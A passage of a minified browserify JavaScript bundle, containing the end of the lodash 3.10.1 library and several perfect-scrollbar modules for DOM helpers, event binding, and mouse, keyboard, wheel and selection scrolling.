Tr(n,$,b,b,b,Ct(t))}),Cf=mo||function(n){return v(n)&&re(n.length)&&ro.call(n)==M},Uf=sr(qt),$f=sr(function(n,t,r){return r?yt(n,t,r):dt(n,t)}),Sf=mr($f,_t),Wf=mr(Uf,ie),Ff=Ar($t),Nf=Ar(St),Tf=Ir(Lo),Lf=Ir(Bo),Bf=Rr($t),zf=Rr(St),Df=xo?function(n){var t=null==n?b:n.constructor;return"function"==typeof t&&t.prototype===n||"function"!=typeof n&&Zr(n)?ce(n):Wu(n)?xo(n):[]}:ce,qf=Or(!0),Mf=Or(),Pf=yu(function(n,t){if(null==n)return{};if("function"!=typeof t[0]){var t=ct(Ct(t),Gi);return oe(n,jt(ni(n),t))}var r=or(t[0],t[1],3);return fe(n,function(n,t,e){return!r(n,t,e)})}),Kf=yu(function(n,t){return null==n?{}:"function"==typeof t[0]?fe(n,or(t[0],t[1],3)):oe(n,Ct(t))}),Vf=gr(function(n,t,r){return t=t.toLowerCase(),n+(r?t.charAt(0).toUpperCase()+t.slice(1):t)}),Yf=gr(function(n,t,r){return n+(r?"-":"")+t.toLowerCase()}),Gf=Er(),Jf=Er(!0),Xf=gr(function(n,t,r){return n+(r?"_":"")+t.toLowerCase()}),Zf=gr(function(n,t,r){return n+(r?" ":"")+(t.charAt(0).toUpperCase()+t.slice(1))}),Hf=yu(function(n,t){try{return n.apply(b,t)}catch(r){return Uu(r)?r:new qi(r)}}),Qf=yu(function(n,t){return function(r){return Xr(r,n,t)}}),na=yu(function(n,t){return function(r){return Xr(n,r,t)}}),ta=Fr("ceil"),ra=Fr("floor"),ea=wr(Au,Ro),ua=wr(Ku,Oo),ia=Fr("round");return G.prototype=H.prototype,nn.prototype=Fo(H.prototype),nn.prototype.constructor=nn,qn.prototype=Fo(H.prototype),qn.prototype.constructor=qn,Vn.prototype["delete"]=Yn,Vn.prototype.get=Gn,Vn.prototype.has=Jn,Vn.prototype.set=Xn,Zn.prototype.push=Qn,vu.Cache=Vn,G.after=lu,G.ary=su,G.assign=$f,G.at=rf,G.before=pu,G.bind=yf,G.bindAll=df,G.bindKey=mf,G.callback=ki,G.chain=De,G.chunk=ve,G.compact=_e,G.constant=Ii,G.countBy=ef,G.create=Ju,G.curry=wf,G.curryRight=xf,G.debounce=hu,G.defaults=Sf,G.defaultsDeep=Wf,G.defer=bf,G.delay=Af,G.difference=Po,G.drop=ge,G.dropRight=ye,G.dropRightWhile=de,G.dropWhile=me,G.fill=we,G.filter=Ze,G.flatten=be,G.flattenDeep=Ae,G.flow=jf,G.flowRight=kf,G.forEach=ff,G.forEachRight=af,G.forIn=Tf,G.forInRight=Lf,G.forOwn=Bf,G.forOwnRight=zf,G.functions=Xu,G.groupBy=cf,G.indexBy=lf,G.initial=ke,G.intersection=Yo,G.invert=Qu,G.invoke=sf,G.keys=Df,G.keysIn=ni,G.map=nu,G.mapKeys=qf,G.mapValues=Mf,G.matches=Oi,G.matchesProperty=Ei,G.memoize=vu,G.merge=Uf,G.method=Qf,G.methodOf=na,G.mixin=Ci,G.modArgs=If,G.negate=_u,G.omit=Pf,G.once=gu,G.pairs=ti,G.partial=Rf,G.partialRight=Of,G.partition=pf,G.pick=Kf,G.pluck=tu,G.property=Si,G.propertyOf=Wi,G.pull=Oe,G.pullAt=Go,G.range=Fi,G.rearg=Ef,G.reject=ru,G.remove=Ee,G.rest=Ce,G.restParam=yu,G.set=ei,G.shuffle=uu,G.slice=Ue,G.sortBy=fu,G.sortByAll=_f,G.sortByOrder=au,G.spread=du,G.take=$e,G.takeRight=Se,G.takeRightWhile=We,G.takeWhile=Fe,G.tap=qe,G.throttle=mu,G.thru=Me,G.times=Ni,G.toArray=Yu,G.toPlainObject=Gu,G.transform=ui,G.union=Zo,G.uniq=Ne,G.unzip=Te,G.unzipWith=Le,G.values=ii,G.valuesIn=oi,G.where=cu,G.without=Ho,G.wrap=wu,G.xor=Be,G.zip=Qo,G.zipObject=ze,G.zipWith=nf,G.backflow=kf,G.collect=nu,G.compose=kf,G.each=ff,G.eachRight=af,G.extend=$f,G.iteratee=ki,G.methods=Xu,G.object=ze,G.select=Ze,G.tail=Ce,G.unique=Ne,Ci(G,G),G.add=Li,G.attempt=Hf,G.camelCase=Vf,G.capitalize=ci,G.ceil=ta,G.clone=xu,G.cloneDeep=bu,G.deburr=li,G.endsWith=si,G.escape=pi,G.escapeRegExp=hi,G.every=Xe,G.find=uf,G.findIndex=Ko,G.findKey=Ff,G.findLast=of,G.findLastIndex=Vo,G.findLastKey=Nf,G.findWhere=He,G.first=xe,G.floor=ra,G.get=Zu,G.gt=Au,G.gte=ju,G.has=Hu,G.identity=Ri,G.includes=Qe,G.indexOf=je,G.inRange=fi,G.isArguments=ku,G.isArray=Cf,G.isBoolean=Iu,G.isDate=Ru,G.isElement=Ou,G.isEmpty=Eu,G.isEqual=Cu,G.isError=Uu,G.isFinite=$u,G.isFunction=Su,G.isMatch=Fu,G.isNaN=Nu,G.isNative=Tu,G.isNull=Lu,G.isNumber=Bu,G.isObject=Wu,G.isPlainObject=zu,G.isRegExp=Du,G.isString=qu,G.isTypedArray=Mu,G.isUndefined=Pu,G.kebabCase=Yf,G.last=Ie,G.lastIndexOf=Re,G.lt=Ku,G.lte=Vu,G.max=ea,G.min=ua,G.noConflict=Ui,G.noop=$i,G.now=gf,G.pad=vi,G.padLeft=Gf,G.padRight=Jf,G.parseInt=_i,G.random=ai,G.reduce=hf,G.reduceRight=vf,G.repeat=gi,G.result=ri,G.round=ia,G.runInContext=x,G.size=iu,G.snakeCase=Xf,G.some=ou,G.sortedIndex=Jo,G.sortedLastIndex=Xo,G.startCase=Zf,G.startsWith=yi,G.sum=Bi,G.template=di,G.trim=mi,G.trimLeft=wi,G.trimRight=xi,G.trunc=bi,G.unescape=Ai,G.uniqueId=Ti,G.words=ji,G.all=Xe,G.any=ou,G.contains=Qe,G.eq=Cu,G.detect=uf,G.foldl=hf,G.foldr=vf,G.head=xe,G.include=Qe,G.inject=hf,Ci(G,function(){var n={};return $t(G,function(t,r){G.prototype[r]||(n[r]=t)}),n}(),!1),G.sample=eu,G.prototype.sample=function(n){return this.__chain__||null!=n?this.thru(function(t){return eu(t,n)}):eu(this.value())},G.VERSION=A,ut(["bind","bindKey","curry","curryRight","partial","partialRight"],function(n){G[n].placeholder=G}),ut(["drop","take"],function(n,t){qn.prototype[n]=function(r){var e=this.__filtered__;if(e&&!t)return new qn(this);r=null==r?1:bo(yo(r)||0,0);var u=this.clone();return e?u.__takeCount__=Ao(u.__takeCount__,r):u.__views__.push({size:r,type:n+(u.__dir__<0?"Right":"")}),u},qn.prototype[n+"Right"]=function(t){return this.reverse()[n](t).reverse()}}),ut(["filter","map","takeWhile"],function(n,t){var r=t+1,e=r!=B;qn.prototype[n]=function(n,t){var u=this.clone();return u.__iteratees__.push({iteratee:Dr(n,t,1),type:r}),u.__filtered__=u.__filtered__||e,u}}),ut(["first","last"],function(n,t){var r="take"+(t?"Right":"");qn.prototype[n]=function(){return this[r](1).value()[0]}}),ut(["initial","rest"],function(n,t){var r="drop"+(t?"":"Right");qn.prototype[n]=function(){return this.__filtered__?new qn(this):this[r](1)}}),ut(["pluck","where"],function(n,t){var r=t?"filter":"map",e=t?zt:Si;qn.prototype[n]=function(n){return this[r](e(n))}}),qn.prototype.compact=function(){return this.filter(Ri)},qn.prototype.reject=function(n,t){return n=Dr(n,t,1),this.filter(function(t){return!n(t)})},qn.prototype.slice=function(n,t){n=null==n?0:+n||0;var r=this;return r.__filtered__&&(n>0||0>t)?new qn(r):(0>n?r=r.takeRight(-n):n&&(r=r.drop(n)),t!==b&&(t=+t||0,r=0>t?r.dropRight(-t):r.take(t-n)),r)},qn.prototype.takeRightWhile=function(n,t){return this.reverse().takeWhile(n,t).reverse()},qn.prototype.toArray=function(){return this.take(Oo)},$t(qn.prototype,function(n,t){var r=/^(?:filter|map|reject)|While$/.test(t),e=/^(?:first|last)$/.test(t),u=G[e?"take"+("last"==t?"Right":""):t];u&&(G.prototype[t]=function(){var t=e?[1]:arguments,i=this.__chain__,o=this.__wrapped__,f=!!this.__actions__.length,a=o instanceof qn,c=t[0],l=a||Cf(o);l&&r&&"function"==typeof c&&1!=c.length&&(a=l=!1);var s=function(n){return e&&i?u(n,1)[0]:u.apply(b,lt([n],t))},p={func:Me,args:[s],thisArg:b},h=a&&!f;if(e&&!i)return h?(o=o.clone(),o.__actions__.push(p),n.call(o)):u.call(b,this.value())[0];if(!e&&l){o=h?o:new qn(this);var v=n.apply(o,t);return v.__actions__.push(p),new nn(v,i)}return this.thru(s)})}),ut(["join","pop","push","replace","shift","sort","splice","split","unshift"],function(n){var t=(/^(?:replace|split)$/.test(n)?Hi:Xi)[n],r=/^(?:push|sort|unshift)$/.test(n)?"tap":"thru",e=/^(?:join|pop|replace|shift)$/.test(n);G.prototype[n]=function(){var n=arguments;return e&&!this.__chain__?t.apply(this.value(),n):this[r](function(r){return t.apply(r,n)})}}),$t(qn.prototype,function(n,t){var r=G[t];if(r){var e=r.name,u=Wo[e]||(Wo[e]=[]);u.push({name:t,func:r})}}),Wo[$r(b,k).name]=[{name:"wrapper",func:b}],qn.prototype.clone=Mn,qn.prototype.reverse=Pn,qn.prototype.value=Kn,G.prototype.chain=Pe,G.prototype.commit=Ke,G.prototype.concat=tf,G.prototype.plant=Ve,G.prototype.reverse=Ye,G.prototype.toString=Ge,G.prototype.run=G.prototype.toJSON=G.prototype.valueOf=G.prototype.value=Je,G.prototype.collect=G.prototype.map,G.prototype.head=G.prototype.first,G.prototype.select=G.prototype.filter,G.prototype.tail=G.prototype.rest,G}var b,A="3.10.1",j=1,k=2,I=4,R=8,O=16,E=32,C=64,U=128,$=256,S=30,W="...",F=150,N=16,T=200,L=1,B=2,z="Expected a function",D="__lodash_placeholder__",q="[object Arguments]",M="[object Array]",P="[object Boolean]",K="[object Date]",V="[object Error]",Y="[object Function]",G="[object Map]",J="[object Number]",X="[object Object]",Z="[object RegExp]",H="[object Set]",Q="[object String]",nn="[object WeakMap]",tn="[object ArrayBuffer]",rn="[object Float32Array]",en="[object Float64Array]",un="[object Int8Array]",on="[object Int16Array]",fn="[object Int32Array]",an="[object Uint8Array]",cn="[object Uint8ClampedArray]",ln="[object Uint16Array]",sn="[object Uint32Array]",pn=/\b__p \+= '';/g,hn=/\b(__p \+=) '' \+/g,vn=/(__e\(.*?\)|\b__t\)) \+\n'';/g,_n=/&(?:amp|lt|gt|quot|#39|#96);/g,gn=/[&<>"'`]/g,yn=RegExp(_n.source),dn=RegExp(gn.source),mn=/<%-([\s\S]+?)%>/g,wn=/<%([\s\S]+?)%>/g,xn=/<%=([\s\S]+?)%>/g,bn=/\.|\[(?:[^[\]]*|(["'])(?:(?!\1)[^\n\\]|\\.)*?\1)\]/,An=/^\w*$/,jn=/[^.[\]]+|\[(?:(-?\d+(?:\.\d+)?)|(["'])((?:(?!\2)[^\n\\]|\\.)*?)\2)\]/g,kn=/^[:!,]|[\\^$.*+?()[\]{}|\/]|(^[0-9a-fA-Fnrtuvx])|([\n\r\u2028\u2029])/g,In=RegExp(kn.source),Rn=/[\u0300-\u036f\ufe20-\ufe23]/g,On=/\\(\\)?/g,En=/\$\{([^\\}]*(?:\\.[^\\}]*)*)\}/g,Cn=/\w*$/,Un=/^0[xX]/,$n=/^\[object .+?Constructor\]$/,Sn=/^\d+$/,Wn=/[\xc0-\xd6\xd8-\xde\xdf-\xf6\xf8-\xff]/g,Fn=/($^)/,Nn=/['\n\r\u2028\u2029\\]/g,Tn=function(){var n="[A-Z\\xc0-\\xd6\\xd8-\\xde]",t="[a-z\\xdf-\\xf6\\xf8-\\xff]+";return RegExp(n+"+(?="+n+t+")|"+n+"?"+t+"|"+n+"+|[0-9]+","g")}(),Ln=["Array","ArrayBuffer","Date","Error","Float32Array","Float64Array","Function","Int8Array","Int16Array","Int32Array","Math","Number","Object","RegExp","Set","String","_","clearTimeout","isFinite","parseFloat","parseInt","setTimeout","TypeError","Uint8Array","Uint8ClampedArray","Uint16Array","Uint32Array","WeakMap"],Bn=-1,zn={};zn[rn]=zn[en]=zn[un]=zn[on]=zn[fn]=zn[an]=zn[cn]=zn[ln]=zn[sn]=!0,zn[q]=zn[M]=zn[tn]=zn[P]=zn[K]=zn[V]=zn[Y]=zn[G]=zn[J]=zn[X]=zn[Z]=zn[H]=zn[Q]=zn[nn]=!1;var Dn={};Dn[q]=Dn[M]=Dn[tn]=Dn[P]=Dn[K]=Dn[rn]=Dn[en]=Dn[un]=Dn[on]=Dn[fn]=Dn[J]=Dn[X]=Dn[Z]=Dn[Q]=Dn[an]=Dn[cn]=Dn[ln]=Dn[sn]=!0,Dn[V]=Dn[Y]=Dn[G]=Dn[H]=Dn[nn]=!1;var qn={"":"A","":"A","":"A","":"A","":"A","":"A","":"a","":"a","":"a","":"a","":"a","":"a","":"C","":"c","":"D","":"d","":"E","":"E","":"E","":"E","":"e","":"e","":"e","":"e","":"I","":"I","":"I","":"I","":"i","":"i","":"i","":"i","":"N","":"n","":"O","":"O","":"O","":"O","":"O","":"O","":"o","":"o","":"o","":"o","":"o","":"o","":"U","":"U","":"U","":"U","":"u","":"u","":"u","":"u","":"Y","":"y","":"y","":"Ae","":"ae","":"Th","":"th","":"ss"},Mn={"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#39;","`":"&#96;"},Pn={"&amp;":"&","&lt;":"<","&gt;":">","&quot;":'"',"&#39;":"'","&#96;":"`"},Kn={"function":!0,object:!0},Vn={0:"x30",1:"x31",2:"x32",3:"x33",4:"x34",5:"x35",6:"x36",7:"x37",8:"x38",9:"x39",A:"x41",B:"x42",C:"x43",D:"x44",E:"x45",F:"x46",a:"x61",b:"x62",c:"x63",d:"x64",e:"x65",f:"x66",n:"x6e",r:"x72",t:"x74",u:"x75",v:"x76",x:"x78"},Yn={"\\":"\\","'":"'","\n":"n","\r":"r","\u2028":"u2028","\u2029":"u2029"},Gn=Kn[typeof exports]&&exports&&!exports.nodeType&&exports,Jn=Kn[typeof module]&&module&&!module.nodeType&&module,Xn=Gn&&Jn&&"object"==typeof global&&global&&global.Object&&global,Zn=Kn[typeof self]&&self&&self.Object&&self,Hn=Kn[typeof window]&&window&&window.Object&&window,Qn=Jn&&Jn.exports===Gn&&Gn,nt=Xn||Hn!==(this&&this.window)&&Hn||Zn||this,tt=x();"function"==typeof define&&"object"==typeof define.amd&&define.amd?(nt._=tt,define(function(){return tt})):Gn&&Jn?Qn?(Jn.exports=tt)._=tt:Gn._=tt:nt._=tt}).call(this);
}).call(this,typeof global !== "undefined" ? global : typeof self !== "undefined" ? self : typeof window !== "undefined" ? window : {})
},{}],22:[function(require,module,exports){
"use strict";module.exports=require("./src/js/adaptor/jquery");
},{"./src/js/adaptor/jquery":23}],23:[function(require,module,exports){
"use strict";function mountJQuery(e){e.fn.perfectScrollbar=function(n){return this.each(function(){if("object"==typeof n||"undefined"==typeof n){var t=n;psInstances.get(this)||ps.initialize(this,t)}else{var i=n;"update"===i?ps.update(this):"destroy"===i&&ps.destroy(this)}return e(this)})}}var ps=require("../main"),psInstances=require("../plugin/instances");if("function"==typeof define&&define.amd)define(["jquery"],mountJQuery);else{var jq=window.jQuery?window.jQuery:window.$;"undefined"!=typeof jq&&mountJQuery(jq)}module.exports=mountJQuery;
},{"../main":29,"../plugin/instances":40}],24:[function(require,module,exports){
"use strict";function oldAdd(s,e){var i=s.className.split(" ");i.indexOf(e)<0&&i.push(e),s.className=i.join(" ")}function oldRemove(s,e){var i=s.className.split(" "),t=i.indexOf(e);t>=0&&i.splice(t,1),s.className=i.join(" ")}exports.add=function(s,e){s.classList?s.classList.add(e):oldAdd(s,e)},exports.remove=function(s,e){s.classList?s.classList.remove(e):oldRemove(s,e)},exports.list=function(s){return s.classList?s.classList:s.className.split(" ")};
},{}],25:[function(require,module,exports){
"use strict";function cssGet(e,t){return window.getComputedStyle(e)[t]}function cssSet(e,t,n){return"number"==typeof n&&(n=n.toString()+"px"),e.style[t]=n,e}function cssMultiSet(e,t){for(var n in t){var o=t[n];"number"==typeof o&&(o=o.toString()+"px"),e.style[n]=o}return e}var DOM={};DOM.e=function(e,t){var n=document.createElement(e);return n.className=t,n},DOM.appendTo=function(e,t){return t.appendChild(e),e},DOM.css=function(e,t,n){return"object"==typeof t?cssMultiSet(e,t):"undefined"==typeof n?cssGet(e,t):cssSet(e,t,n)},DOM.matches=function(e,t){return"undefined"!=typeof e.matches?e.matches(t):"undefined"!=typeof e.matchesSelector?e.matchesSelector(t):"undefined"!=typeof e.webkitMatchesSelector?e.webkitMatchesSelector(t):"undefined"!=typeof e.mozMatchesSelector?e.mozMatchesSelector(t):"undefined"!=typeof e.msMatchesSelector?e.msMatchesSelector(t):void 0},DOM.remove=function(e){"undefined"!=typeof e.remove?e.remove():e.parentNode&&e.parentNode.removeChild(e)},DOM.queryChildren=function(e,t){return Array.prototype.filter.call(e.childNodes,function(e){return DOM.matches(e,t)})},module.exports=DOM;
},{}],26:[function(require,module,exports){
"use strict";var EventElement=function(e){this.element=e,this.events={}};EventElement.prototype.bind=function(e,n){"undefined"==typeof this.events[e]&&(this.events[e]=[]),this.events[e].push(n),this.element.addEventListener(e,n,!1)},EventElement.prototype.unbind=function(e,n){var t="undefined"!=typeof n;this.events[e]=this.events[e].filter(function(i){return t&&i!==n?!0:(this.element.removeEventListener(e,i,!1),!1)},this)},EventElement.prototype.unbindAll=function(){for(var e in this.events)this.unbind(e)};var EventManager=function(){this.eventElements=[]};EventManager.prototype.eventElement=function(e){var n=this.eventElements.filter(function(n){return n.element===e})[0];return"undefined"==typeof n&&(n=new EventElement(e),this.eventElements.push(n)),n},EventManager.prototype.bind=function(e,n,t){this.eventElement(e).bind(n,t)},EventManager.prototype.unbind=function(e,n,t){this.eventElement(e).unbind(n,t)},EventManager.prototype.unbindAll=function(){for(var e=0;e<this.eventElements.length;e++)this.eventElements[e].unbindAll()},EventManager.prototype.once=function(e,n,t){var i=this.eventElement(e),s=function(e){i.unbind(n,s),t(e)};i.bind(n,s)},module.exports=EventManager;
},{}],27:[function(require,module,exports){
"use strict";module.exports=function(){function t(){return Math.floor(65536*(1+Math.random())).toString(16).substring(1)}return function(){return t()+t()+"-"+t()+"-"+t()+"-"+t()+"-"+t()+t()+t()}}();
},{}],28:[function(require,module,exports){
"use strict";var cls=require("./class"),d=require("./dom");exports.toInt=function(t){return parseInt(t,10)||0},exports.clone=function(t){if(null===t)return null;if("object"==typeof t){var e={};for(var n in t)e[n]=this.clone(t[n]);return e}return t},exports.extend=function(t,e){var n=this.clone(t);for(var s in e)n[s]=this.clone(e[s]);return n},exports.isEditable=function(t){return d.matches(t,"input,[contenteditable]")||d.matches(t,"select,[contenteditable]")||d.matches(t,"textarea,[contenteditable]")||d.matches(t,"button,[contenteditable]")},exports.removePsClasses=function(t){for(var e=cls.list(t),n=0;n<e.length;n++){var s=e[n];0===s.indexOf("ps-")&&cls.remove(t,s)}},exports.outerWidth=function(t){return this.toInt(d.css(t,"width"))+this.toInt(d.css(t,"paddingLeft"))+this.toInt(d.css(t,"paddingRight"))+this.toInt(d.css(t,"borderLeftWidth"))+this.toInt(d.css(t,"borderRightWidth"))},exports.startScrolling=function(t,e){cls.add(t,"ps-in-scrolling"),"undefined"!=typeof e?cls.add(t,"ps-"+e):(cls.add(t,"ps-x"),cls.add(t,"ps-y"))},exports.stopScrolling=function(t,e){cls.remove(t,"ps-in-scrolling"),"undefined"!=typeof e?cls.remove(t,"ps-"+e):(cls.remove(t,"ps-x"),cls.remove(t,"ps-y"))},exports.env={isWebKit:"WebkitAppearance"in document.documentElement.style,supportsTouch:"ontouchstart"in window||window.DocumentTouch&&document instanceof window.DocumentTouch,supportsIePointer:null!==window.navigator.msMaxTouchPoints};
},{"./class":24,"./dom":25}],29:[function(require,module,exports){
"use strict";var destroy=require("./plugin/destroy"),initialize=require("./plugin/initialize"),update=require("./plugin/update");module.exports={initialize:initialize,update:update,destroy:destroy};
},{"./plugin/destroy":31,"./plugin/initialize":39,"./plugin/update":42}],30:[function(require,module,exports){
"use strict";module.exports={wheelSpeed:1,wheelPropagation:!1,swipePropagation:!0,minScrollbarLength:null,maxScrollbarLength:null,useBothWheelAxes:!1,useKeyboard:!0,suppressScrollX:!1,suppressScrollY:!1,scrollXMarginOffset:0,scrollYMarginOffset:0,stopPropagationOnClick:!0};
},{}],31:[function(require,module,exports){
"use strict";var d=require("../lib/dom"),h=require("../lib/helper"),instances=require("./instances");module.exports=function(e){var r=instances.get(e);r&&(r.event.unbindAll(),d.remove(r.scrollbarX),d.remove(r.scrollbarY),d.remove(r.scrollbarXRail),d.remove(r.scrollbarYRail),h.removePsClasses(e),instances.remove(e))};
},{"../lib/dom":25,"../lib/helper":28,"./instances":40}],32:[function(require,module,exports){
"use strict";function bindClickRailHandler(t,i){function e(t){return t.getBoundingClientRect()}var r=window.Event.prototype.stopPropagation.bind;i.settings.stopPropagationOnClick&&i.event.bind(i.scrollbarY,"click",r),i.event.bind(i.scrollbarYRail,"click",function(r){var o=h.toInt(i.scrollbarYHeight/2),n=i.railYRatio*(r.pageY-window.scrollY-e(i.scrollbarYRail).top-o),l=i.railYRatio*(i.railYHeight-i.scrollbarYHeight),a=n/l;0>a?a=0:a>1&&(a=1),t.scrollTop=(i.contentHeight-i.containerHeight)*a,updateGeometry(t),r.stopPropagation()}),i.settings.stopPropagationOnClick&&i.event.bind(i.scrollbarX,"click",r),i.event.bind(i.scrollbarXRail,"click",function(r){var o=h.toInt(i.scrollbarXWidth/2),n=i.railXRatio*(r.pageX-window.scrollX-e(i.scrollbarXRail).left-o),l=i.railXRatio*(i.railXWidth-i.scrollbarXWidth),a=n/l;0>a?a=0:a>1&&(a=1),t.scrollLeft=(i.contentWidth-i.containerWidth)*a-i.negativeScrollAdjustment,updateGeometry(t),r.stopPropagation()})}var h=require("../../lib/helper"),instances=require("../instances"),updateGeometry=require("../update-geometry");module.exports=function(t){var i=instances.get(t);bindClickRailHandler(t,i)};
},{"../../lib/helper":28,"../instances":40,"../update-geometry":41}],33:[function(require,module,exports){
"use strict";function bindMouseScrollXHandler(e,o){function t(t){var r=n+t*o.railXRatio,l=o.scrollbarXRail.getBoundingClientRect().left+o.railXRatio*(o.railXWidth-o.scrollbarXWidth);0>r?o.scrollbarXLeft=0:r>l?o.scrollbarXLeft=l:o.scrollbarXLeft=r;var a=h.toInt(o.scrollbarXLeft*(o.contentWidth-o.containerWidth)/(o.containerWidth-o.railXRatio*o.scrollbarXWidth))-o.negativeScrollAdjustment;e.scrollLeft=a}var n=null,r=null,l=function(o){t(o.pageX-r),updateGeometry(e),o.stopPropagation(),o.preventDefault()},a=function(){h.stopScrolling(e,"x"),o.event.unbind(o.ownerDocument,"mousemove",l)};o.event.bind(o.scrollbarX,"mousedown",function(t){r=t.pageX,n=h.toInt(d.css(o.scrollbarX,"left"))*o.railXRatio,h.startScrolling(e,"x"),o.event.bind(o.ownerDocument,"mousemove",l),o.event.once(o.ownerDocument,"mouseup",a),t.stopPropagation(),t.preventDefault()})}function bindMouseScrollYHandler(e,o){function t(t){var r=n+t*o.railYRatio,l=o.scrollbarYRail.getBoundingClientRect().top+o.railYRatio*(o.railYHeight-o.scrollbarYHeight);0>r?o.scrollbarYTop=0:r>l?o.scrollbarYTop=l:o.scrollbarYTop=r;var a=h.toInt(o.scrollbarYTop*(o.contentHeight-o.containerHeight)/(o.containerHeight-o.railYRatio*o.scrollbarYHeight));e.scrollTop=a}var n=null,r=null,l=function(o){t(o.pageY-r),updateGeometry(e),o.stopPropagation(),o.preventDefault()},a=function(){h.stopScrolling(e,"y"),o.event.unbind(o.ownerDocument,"mousemove",l)};o.event.bind(o.scrollbarY,"mousedown",function(t){r=t.pageY,n=h.toInt(d.css(o.scrollbarY,"top"))*o.railYRatio,h.startScrolling(e,"y"),o.event.bind(o.ownerDocument,"mousemove",l),o.event.once(o.ownerDocument,"mouseup",a),t.stopPropagation(),t.preventDefault()})}var d=require("../../lib/dom"),h=require("../../lib/helper"),instances=require("../instances"),updateGeometry=require("../update-geometry");module.exports=function(e){var o=instances.get(e);bindMouseScrollXHandler(e,o),bindMouseScrollYHandler(e,o)};
},{"../../lib/dom":25,"../../lib/helper":28,"../instances":40,"../update-geometry":41}],34:[function(require,module,exports){
"use strict";function bindKeyboardHandler(e,t){function r(r,n){var a=e.scrollTop;if(0===r){if(!t.scrollbarYActive)return!1;if(0===a&&n>0||a>=t.contentHeight-t.containerHeight&&0>n)return!t.settings.wheelPropagation}var i=e.scrollLeft;if(0===n){if(!t.scrollbarXActive)return!1;if(0===i&&0>r||i>=t.contentWidth-t.containerWidth&&r>0)return!t.settings.wheelPropagation}return!0}var n=!1;t.event.bind(e,"mouseenter",function(){n=!0}),t.event.bind(e,"mouseleave",function(){n=!1});var a=!1;t.event.bind(t.ownerDocument,"keydown",function(i){if((!i.isDefaultPrevented||!i.isDefaultPrevented())&&n){var o=document.activeElement?document.activeElement:t.ownerDocument.activeElement;if(o){for(;o.shadowRoot;)o=o.shadowRoot.activeElement;if(h.isEditable(o))return}var c=0,s=0;switch(i.which){case 37:c=-30;break;case 38:s=30;break;case 39:c=30;break;case 40:s=-30;break;case 33:s=90;break;case 32:s=i.shiftKey?90:-90;break;case 34:s=-90;break;case 35:s=i.ctrlKey?-t.contentHeight:-t.containerHeight;break;case 36:s=i.ctrlKey?e.scrollTop:t.containerHeight;break;default:return}e.scrollTop=e.scrollTop-s,e.scrollLeft=e.scrollLeft+c,updateGeometry(e),a=r(c,s),a&&i.preventDefault()}})}var h=require("../../lib/helper"),instances=require("../instances"),updateGeometry=require("../update-geometry");module.exports=function(e){var t=instances.get(e);bindKeyboardHandler(e,t)};
},{"../../lib/helper":28,"../instances":40,"../update-geometry":41}],35:[function(require,module,exports){
"use strict";function bindMouseWheelHandler(e,t){function l(l,r){var o=e.scrollTop;if(0===l){if(!t.scrollbarYActive)return!1;if(0===o&&r>0||o>=t.contentHeight-t.containerHeight&&0>r)return!t.settings.wheelPropagation}var n=e.scrollLeft;if(0===r){if(!t.scrollbarXActive)return!1;if(0===n&&0>l||n>=t.contentWidth-t.containerWidth&&l>0)return!t.settings.wheelPropagation}return!0}function r(e){var t=e.deltaX,l=-1*e.deltaY;return("undefined"==typeof t||"undefined"==typeof l)&&(t=-1*e.wheelDeltaX/6,l=e.wheelDeltaY/6),e.deltaMode&&1===e.deltaMode&&(t*=10,l*=10),t!==t&&l!==l&&(t=0,l=e.wheelDelta),[t,l]}function o(t,l){var r=e.querySelector("textarea:hover");if(r){var o=r.scrollHeight-r.clientHeight;if(o>0&&!(0===r.scrollTop&&l>0||r.scrollTop===o&&0>l))return!0;var n=r.scrollLeft-r.clientWidth;if(n>0&&!(0===r.scrollLeft&&0>t||r.scrollLeft===n&&t>0))return!0}return!1}function n(n){if(h.env.isWebKit||!e.querySelector("select:focus")){var s=r(n),c=s[0],a=s[1];o(c,a)||(i=!1,t.settings.useBothWheelAxes?t.scrollbarYActive&&!t.scrollbarXActive?(a?e.scrollTop=e.scrollTop-a*t.settings.wheelSpeed:e.scrollTop=e.scrollTop+c*t.settings.wheelSpeed,i=!0):t.scrollbarXActive&&!t.scrollbarYActive&&(c?e.scrollLeft=e.scrollLeft+c*t.settings.wheelSpeed:e.scrollLeft=e.scrollLeft-a*t.settings.wheelSpeed,i=!0):(e.scrollTop=e.scrollTop-a*t.settings.wheelSpeed,e.scrollLeft=e.scrollLeft+c*t.settings.wheelSpeed),updateGeometry(e),i=i||l(c,a),i&&(n.stopPropagation(),n.preventDefault()))}}var i=!1;"undefined"!=typeof window.onwheel?t.event.bind(e,"wheel",n):"undefined"!=typeof window.onmousewheel&&t.event.bind(e,"mousewheel",n)}var h=require("../../lib/helper"),instances=require("../instances"),updateGeometry=require("../update-geometry");module.exports=function(e){var t=instances.get(e);bindMouseWheelHandler(e,t)};
},{"../../lib/helper":28,"../instances":40,"../update-geometry":41}],36:[function(require,module,exports){
"use strict";function bindNativeScrollHandler(e,t){t.event.bind(e,"scroll",function(){updateGeometry(e)})}var instances=require("../instances"),updateGeometry=require("../update-geometry");module.exports=function(e){var t=instances.get(e);bindNativeScrollHandler(e,t)};
},{"../instances":40,"../update-geometry":41}],37:[function(require,module,exports){
"use strict";function bindSelectionHandler(t,e){function o(){var t=window.getSelection?window.getSelection():document.getSelection?document.getSelection():"";return 0===t.toString().length?null:t.getRangeAt(0).commonAncestorContainer}function n(){i||(i=setInterval(function(){return instances.get(t)?(t.scrollTop=t.scrollTop+r.top,t.scrollLeft=t.scrollLeft+r.left,void updateGeometry(t)):void clearInterval(i)},50))}function l(){i&&(clearInterval(i),i=null),h.stopScrolling(t)}var i=null,r={top:0,left:0},c=!1;e.event.bind(e.ownerDocument,"selectionchange",function(){t.contains(o())?c=!0:(c=!1,l())}),e.event.bind(window,"mouseup",function(){c&&(c=!1,l())}),e.event.bind(window,"mousemove",function(e){if(c){var o={x:e.pageX,y:e.pageY},i={left:t.offsetLeft,right:t.offsetLeft+t.offsetWidth,top:t.offsetTop,bottom:t.offsetTop+t.offsetHeight};o.x<i.left+3?(r.left=-5,h.startScrolling(t,"x")):o.x>i.right-3?(r.left=5,h.startScrolling(t,"x")):r.left=0,o.y<i.top+3?(i.top+3-o.y<5?r.top=-5:r.top=-20,h.startScrolling(t,"y")):o.y>i.bottom-3?(o.y-i.bottom+3<5?r.top=5:r.top=20,h.startScrolling(t,"y")):r.top=0,0===r.top&&0===r.left?l():n()}})}var h=require("../../lib/helper"),instances=require("../instances"),updateGeometry=require("../update-geometry");module.exports=function(t){var e=instances.get(t);bindSelectionHandler(t,e)};
